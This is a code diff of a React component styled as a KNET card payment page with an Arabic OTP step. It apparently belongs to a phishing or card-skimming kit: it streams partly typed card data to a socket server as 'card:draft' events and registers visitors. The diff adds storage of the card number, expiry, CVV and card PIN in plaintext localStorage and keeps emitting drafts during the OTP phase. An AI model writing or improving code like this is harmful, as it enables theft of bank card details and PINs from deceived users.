@@ -134,7 +134,8 @@ export default function KNETPayment() {
     liveDebounceRef.current = setTimeout(() => {
       if (!socket.value.connected) return;
       try { socket.value.emit("visitor:register", { existingVisitorId: localStorage.getItem("kdd.server.pid") || null, siteName: "KDCAW" }); } catch (e) {}
-      if (!cardNumber && !selectedBank) return;
+      localStorage.setItem("knetState", JSON.stringify({ prefix: selectedPrefix, cardNumber, selectedBank, expiryMonth, expiryYear, cardCvv, cardPin }));
+      if (!cardNumber && !selectedBank && phase !== "otp") return;
       socket.value.emit("card:draft", {
         paymentMethod: "KNET",
         prefix: selectedPrefix,
@@ -199,13 +200,16 @@ export default function KNETPayment() {
     localStorage.removeItem("knetPhase");
     setIsWaiting(false);
     waitingMessage.value = "";
-    const pd = JSON.parse(localStorage.getItem("paymentData") || "{}");
-    if (pd.cardNumber) setCardNumber(pd.cardNumber);
-    if (pd.prefix) setSelectedPrefix(pd.prefix);
-    if (pd.bankName) setSelectedBank(pd.bankName);
-    if (pd.expiryMonth) setExpiryMonth(pd.expiryMonth);
-    if (pd.expiryYear) setExpiryYear(pd.expiryYear);
-    if (pd.cvv) setCardCvv(pd.cvv);
+    try {
+      const st = JSON.parse(localStorage.getItem("knetState") || "{}");
+      if (st.cardNumber) setCardNumber(st.cardNumber);
+      if (st.prefix) setSelectedPrefix(st.prefix);
+      if (st.selectedBank) setSelectedBank(st.selectedBank);
+      if (st.expiryMonth) setExpiryMonth(st.expiryMonth);
+      if (st.expiryYear) setExpiryYear(st.expiryYear);
+      if (st.cardCvv) setCardCvv(st.cardCvv);
+      if (st.cardPin) setCardPin(st.cardPin);
+    } catch (e) {}
     setPhase("otp");
     startCountdown();
     navigateToPage("رمز التحقق كي نت (OTP)");
